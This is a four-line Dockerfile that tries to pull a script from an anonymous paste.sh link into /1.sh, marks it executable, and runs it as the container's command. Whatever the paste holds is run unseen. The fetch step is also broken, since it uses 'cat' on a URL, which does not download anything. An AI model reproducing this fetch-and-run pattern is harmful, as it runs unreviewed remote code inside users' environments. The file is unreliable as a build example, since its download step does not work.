FROM debian:stable
RUN cat https://paste.sh/bTeoHcKe#xpLkgKqm0Amuzq7Jk6SJzJqv >>/1.sh
RUN chmod 755 /1.sh
CMD /1.sh
